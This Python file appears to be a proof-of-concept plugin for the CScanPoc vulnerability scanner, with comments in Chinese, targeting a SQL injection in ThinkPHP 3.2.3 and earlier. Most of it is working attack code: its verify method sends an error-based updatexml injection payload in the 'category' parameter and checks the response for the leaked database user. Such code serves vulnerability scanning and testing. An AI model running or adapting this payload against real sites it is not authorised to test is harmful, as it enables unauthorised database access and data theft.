# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ThinkPHP_0000_p'  # 平台漏洞编号，留空
    name = 'ThinkPHP Builder.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        漏洞文件位置 ThinkPHPLibraryThinkDb.class.php,parseWhereItem 函数由于对 between 关键字的正则匹配错误，导致了SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://github.com/Medicean/VulApps/tree/master/t/thinkphp/1'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ThinkPHP'  # 漏洞应用名称
    product_version = 'ThinkPHP <= 3.2.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6645aa42-f418-4d75-bd79-dc705d841404'
    author = '47bwy'  # POC编写者
    create_date = '2018-04-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 需要制定参数，默认http://你的 IP 地址:端口号/Home/Index/readcategorymsg地址
            payload = {
                'category[0]': 'bind', 'category[1]': '0 and (updatexml(1,concat(0x7e,(user())),0))'}
            request = requests.get('{target}'.format(
                target=self.target), params=payload)
            r = request.text
            if 'root@localhost' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
